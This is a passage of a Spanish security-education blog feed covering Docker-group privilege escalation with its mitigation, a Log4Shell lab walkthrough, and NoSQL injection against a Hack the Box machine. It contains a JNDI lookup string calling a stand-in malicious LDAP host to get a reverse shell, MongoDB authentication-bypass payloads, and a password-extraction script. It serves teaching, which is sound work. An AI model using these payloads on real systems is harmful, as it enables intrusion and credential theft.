+&lt;p&gt;Para evitarnos tener que utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; siempre que empleemos comandos Docker, existe el grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt; y añadiendo usuarios a él es equivalente a proporcionar privilegios de root a sus usuarios. De ahí surge la posibilidad de la escalada de privilegios que da título a este post.&lt;/p&gt;
+
+&lt;p&gt;Además, se debe tener en cuenta que, por defecto, el usuario que corra un contenedor tendrá privilegios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; dentro del mismo.&lt;/p&gt;
+
+&lt;p&gt;Y en este caso hablamos de Docker pero es un problema común a todos los sistemas de contenedores, como por ejemplo &lt;a href=&quot;https://reboare.github.io/lxd/lxd-escape.html&quot;&gt;LXD&lt;/a&gt; entre otros.&lt;/p&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;p&gt;Vamos a realizar una comprobación desde cero. Nos cremos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker_privesc&lt;/code&gt; y lo añadimos al grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Es muy habitual que necesitemos eliminar y reinicar un contenedor porque se ha actualizado la imagen o porque se ha actualido el Dockerfile. Por estos motivos, es igual de habitual que necesitemos tene persistencia de datos y hagamos uso de los conocidos como &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;volúmenes&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a crear un contenedor que haga uso de los volúmenes de una forma no recomendable. En primer lugar nos creamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; del sistema:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/2-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora corremos un contenedor con una imagen de &lt;em&gt;alpine&lt;/em&gt; haciendo uso de un volumen que montará en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt&lt;/code&gt; del contenedor el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; de nuestro sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que podemos leer sin problemas el archivo creado por root previamente en nuestro sistema. Dicho en otras palabras, tenemos acceso a nuestro sistema como usuario root.&lt;/p&gt;
+
+&lt;p&gt;Otra forma aún más obvia de ver el error en el que se puede incurrir con los contenedores, los volúmenes y los privilegios con el que corre el demonio pertinente, podemos verla en la siguiente imagen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Corremos la imagen de alpine de forma interactiva, indicándole que tendrá un volumen que mapeará el directorio raíz en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt&lt;/code&gt; del contenedor y que, además, haga un &lt;a href=&quot;https://es.wikipedia.org/wiki/Chroot&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;&lt;/a&gt; que convertirá nuestro directorio raíz en el contenedor, en el directorio raíz del sistema. Es decir, ¡somos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; del sistema anfitrión!&lt;/p&gt;
+
+&lt;h2 id=&quot;mitigación&quot;&gt;Mitigación&lt;/h2&gt;
+
+&lt;p&gt;La misma documentación oficial de Docker ofrece una propuesta de &lt;a href=&quot;https://docs.docker.com/engine/security/userns-remap/#enable-userns-remap-on-the-daemon&quot;&gt;solución o mitigación&lt;/a&gt; a este problema.&lt;/p&gt;
+
+&lt;p&gt;En esencia se nos dice que las aplicacinoes &lt;em&gt;contenerizadas&lt;/em&gt; deben correr con usuarios no privilegiados. No obstante, si los procesos de un contenedor concrete deben correr como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; dentro del contenedor, se debe &lt;strong&gt;remapear&lt;/strong&gt; este usuario a otro menos privilegiado del sistema anfitrión.&lt;/p&gt;
+
+&lt;p&gt;En &lt;a href=&quot;https://flast101.github.io/docker-privesc/&quot;&gt;este&lt;/a&gt; ejemplo se nos muestra, en el punto dedicado a la mitigación, como creando un usuario llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dockremap&lt;/code&gt;, podemos remapearlo a un usuario poco privilegiado. Podemos comprobarlo siguiendo las instrucciones que allí se nos indican:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt;, efectivamente se nos está ejecutando como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tras ejecutar el script que aplica los pasos de mitigación explicados en la documentación oficial:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/docker/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El sleep ahora está ejecutado por el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dockremap&lt;/code&gt;. Así pues, quedamos protegidos de la escalada de privilegios mientras que en el contenedor el usuario que ejecuta los procesos sí es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry><entry><title type="html">Explotar vulnerabilidad de Log4j (CVE-2021-44228)</title><link href="https://raul-profesor.github.io/log4j.html" rel="alternate" type="text/html" title="Explotar vulnerabilidad de Log4j (CVE-2021-44228)" /><published>2022-02-17T00:00:00+01:00</published><updated>2022-02-17T00:00:00+01:00</updated><id>https://raul-profesor.github.io/Log4j</id><content type="html" xml:base="https://raul-profesor.github.io/log4j.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;p&gt;En esta ocasión vamos a realizar una práctica de laboratorio sencilla donde explotaremos la en su día ya famosa vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Log4shell&lt;/code&gt;. Esta vulnerabilidad es del tipo RCE (Ejecución Remota de código), con una gran criticidad y fue en su momento un 0day en el popular paquete de logging &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log4j&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Algunos detalles más técnicos de la vulnerabilidad pueden leerse &lt;a href=&quot;https://www.lunasec.io/docs/blog/log4j-zero-day/&quot;&gt;aquí&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;A partir de esta vulnerabilidad y su correspondiente parche, se fueron desencadenado nuevas vulnerabilidades. La &lt;a href=&quot;https://blog.aquasec.com/log4j-vulnerabilities-overview&quot;&gt;siguiente&lt;/a&gt; imagen muestra la línea de acontecimientos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/key-log4j-events-timeline.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cuál-es-el-problema-que-genera-la-vulnerabilidad&quot;&gt;¿Cuál es el problema que genera la vulnerabilidad?&lt;/h2&gt;
+
+&lt;p&gt;El meollo de esta vulnerabilidad está contado bastante bien &lt;a href=&quot;https://www.akamai.com/es/blog/security/a-log4j-retrospective&quot;&gt;aquí&lt;/a&gt; y &lt;a href=&quot;https://infosecwriteups.com/log4j-zero-day-vulnerability-exploitation-detection-mitigation-9667908857b4&quot;&gt;aquí&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;A muy grandes rasgos, log4j permite registrar expresiones en los logs que contengan variables, de tal forma que al loggearse la información, log4j interpreta la expresión y sustituye las variables adecuadamente:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;${date:MM-dd-yyyy} Access granted&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Además, log4j permite anidar expresiones de búsquedas unas dentro de otras.&lt;/p&gt;
+
+&lt;h3 id=&quot;jndi-java-naming-and-directory-interface&quot;&gt;JNDI (Java Naming and Directory Interface)&lt;/h3&gt;
+
+&lt;p&gt;Esta funcionalidad de log4j permite a una aplicación obtener datos de un servidor remoto utilizando protocolos tales como LDAP o RMI.&lt;/p&gt;
+
+&lt;p&gt;Todo esta teoría junta, puede usarse para explotar la vulnerabilidad de la siguiente forma:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/00.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Es decir, muy resumidas, ocurren las siguiente cosas:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Un atacante realiza una petición a la aplicación vulnerable y “cuela” una cadena JNDI para ser loggeada por log4j (en una cabecera HTTP por ejemplo)
+ Esta cadena contiene una petición de búsqueda a un servidor LDAP malicioso.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Esta petición o cadena es, efectivamente, loggeada por log4j, que la interpreta y contacta con el servidor LDAP malicioso&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El servidor LDAP malicioso responde con una clase Java maliciosa&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El servidor víctima deserializa o descarga la clase Java malicoso y la ejecuta&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;p&gt;Para este escenario me he basado es una explicación genial de un buen &lt;a href=&quot;https://ciberseguridad.blog/como-explotar-la-vulnerabilidad-log4shell-en-nuestro-laboratorio/ ¡&quot;&gt;blog&lt;/a&gt; en español y me parece importante darle su crédito.&lt;/p&gt;
+
+&lt;p&gt;Vamos a utilizar dos máquinas virtuales:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;En la primera ejecutaremos una aplicación vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log4shell&lt;/code&gt;. Se tratará de &lt;a href=&quot;https://github.com/christophetd/log4shell-vulnerable-app&quot;&gt;este&lt;/a&gt; contenedor Docker. Utilizaré un Lubuntu que tenía a mano.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;En la segunda ejecutaremos un &lt;a href=&quot;https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2&quot;&gt;exploit&lt;/a&gt; diseñado para esta vulnerabilidad, que levantará un servidor LDAP (para recibir la petición de la víctima) y otro HTTP (para servir el exploit).&lt;/p&gt;
+
+    &lt;p&gt;También pondremos un netcat a escuchar, ya que el exploit establecerá una shell reversa.&lt;/p&gt;
+
+    &lt;p&gt;Y desde este servidor será desde realizaremos la petición maliciosa a la víctima, mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, construida adecuadamente para explotar la vulnerabilidad descrita.&lt;/p&gt;
+
+    &lt;p&gt;Utilizaré una Debian que también tenía a mano.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;En esencia, la cosa quedaría así:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/diagrama.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Así pues, vayamos al lío. Ejecutamos la aplicación vulnerablen en el Lubuntu:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos el exploit en la Debian. Comprobamos como se inician el servidor LDAP (puerto 1389) y el HTTP (el 8888 le hemos indicado):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ponemos en esta misma máquina netcat a la escucha para recibir la reverse shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La petición CURL que vamos a realizar, será del tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${jndi:ldap://www.malicious.com/payload}&lt;/code&gt;, donde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.malicious.com&lt;/code&gt; es el servidor LDAP malicioso y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload&lt;/code&gt; será la orden a ejecutar para conseguir la reverse shell, codificada en base64.&lt;/p&gt;
+
+&lt;p&gt;El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La petición CURL completa:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El servidor con la aplicación vulnerable recibiendo la petición:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nuestros servidores maliciosos en la máquina DEbian recibiendo sus respectivas peticiones LDAP y HTTP sirviendo la clase Java maliciosa:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y tras este intercambio de peticiones y respuestas, obtenemos nuestra shell inversa:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/log4j/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry><entry><title type="html">Inyecciones NoSQL (MongoDB) y extracción de información</title><link href="https://raul-profesor.github.io/nosql-injection.html" rel="alternate" type="text/html" title="Inyecciones NoSQL (MongoDB) y extracción de información" /><published>2022-02-09T00:00:00+01:00</published><updated>2022-02-09T00:00:00+01:00</updated><id>https://raul-profesor.github.io/NoSQL-injection</id><content type="html" xml:base="https://raul-profesor.github.io/nosql-injection.html">&lt;h2 id=&quot;explicación-teórica&quot;&gt;Explicación teórica&lt;/h2&gt;
+
+&lt;p&gt;En alguna ocasión, y muy de refilón, había tenido que lidiar con bases de datos NoSQL para alguna cosa muy sencilla y puntual. Sin embargo, en cuestiones de seguridad, nunca me había topado con ellas.&lt;/p&gt;
+
+&lt;p&gt;No voy a explicar aquí lo que son las archiconocidas inyecciones SQL porque esto sólo pretende ser una nota personal y/o idea para una futura práctica, además de haber documentación a paladas en Internet para enterarse.&lt;/p&gt;
+
+&lt;p&gt;La idea principal es que poniendo el ejemplo de un formulario de login, una vez introducidos usuario y contraseña, estos se verificarán contra la BBDD NoSQL (en nuestro caso MongoDB) tal y como podría suceder con una BBDD SQL. La diferencia obvia entre una inyección SQL y una NoSQL es la gramática y la sintaxis.&lt;/p&gt;
+
+&lt;p&gt;Puesto que las BBDD NoSQL no tienen un lenguaje estandarizado, haremos uso de algunos operadores para extraer información. Por ejemplo, en el caso que se comentaba de un formulario de login, podemos utilizar operadores como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$gt&lt;/code&gt; (grater than, mayor que) o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ne&lt;/code&gt; (not equal, no igual a). Así las cosas, en el ejemplo del login que comentábamos, suponiendo que la petición se realiza por POST y con DATA una forma de hacer un bypass de la autenticación sería:&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;username[$ne]=invent&amp;amp;password[$ne]=invent
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Si el usuario/password no es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ìnvent&lt;/code&gt; esta condición se cumple y habremos realizado el bypass de la autenticación.&lt;/p&gt;
+
+&lt;p&gt;De la misma forma, usando estos operadores, así como otro dedicado a las expresiones regulares: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$regex&lt;/code&gt;, podremos ir extrayendo información de la base de datos. Vamos a demostrar que podemos obtener tanto los usuarios en primera instancia, como el password a partir de ellos:&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;username[$ne]=invent&amp;amp;password[$regex]=r.*
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esta sentencia, si el nombre de usuario no es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invent&lt;/code&gt; y, además, el password cumple la expresión regular (que el valor de password empiece por r y vaya seguido de cualquier número y tipo de carácteres), tendremos una respuesta positiva de algún modo.&lt;/p&gt;
+
+&lt;p&gt;La idea sería ir iterando a través de todas las letras y carácteres del alfabeto con el fin de ir ensamblando los valores que nos den respuesta positiva y que, finalmente, formarán el usuario/password que buscamos.&lt;/p&gt;
+
+&lt;h2 id=&quot;caso-práctico&quot;&gt;Caso práctico&lt;/h2&gt;
+
+&lt;h3 id=&quot;authentication-bypass&quot;&gt;Authentication bypass&lt;/h3&gt;
+
+&lt;p&gt;Veamos un caso práctico con la máquina Mango de Hack the box.&lt;/p&gt;
+
+&lt;p&gt;Tenemos una pantalla de login tal que así:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/mango_login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y el intento de login infructuoso, nos da como resultado una respuesta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;200 OK&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sin embargo, utilizando el primer payload que hemos visto, obtenemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;302 Found&lt;/code&gt;, que en el navegador comprobamos que se corresponde con una respuesta positiva de la base de datos y, por ende, en auténtico bypass de la autenticación:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;extracción-de-usuarios-y-contraseñas&quot;&gt;Extracción de usuarios y contraseñas&lt;/h3&gt;
+
+&lt;p&gt;Para este caso, vamos a usar un script disponible en &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-urlencoded-body&quot;&gt;PayloadAllTheThings&lt;/a&gt; pero ligeramente modificado para nuestras necesidades:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib3&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://laquesea/&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'content-type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/x-www-form-urlencoded'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#Si excluimos la a de todas las iteraciones y el user contiene la a... no lo sacará
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username=%s&amp;amp;password[$regex]=^%s&amp;amp;login=login'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+               &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Found one more char : %s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Puesto que primero queremos extraer los usuarios, utilizaremos una inyección que lo consiga mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$regex&lt;/code&gt; en el username y un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ne&lt;/code&gt; que se cumpla en el campo password:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y vemos que el script funciona bien:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Puede que haya más usuarios, ahora lanzaremos el script de la misma forma pero excluyendo usuarios que empiecen por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; (sino volvería a salir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Claro, el problema es que si excluimos la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; de la iteración, si el nuevo nombre de usuario la contiene, no la encontrará y no podrá seguir extrayendo el username. Sabiendo ya que el nuevo usuario empieza por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m&lt;/code&gt;, actuamos en consecuencia:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Teniendo ya los nombres de usuario, vamos a obtener sus contraseñas haciendo uso de ellos, utilizando esta vez la  inyección el el campo password:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
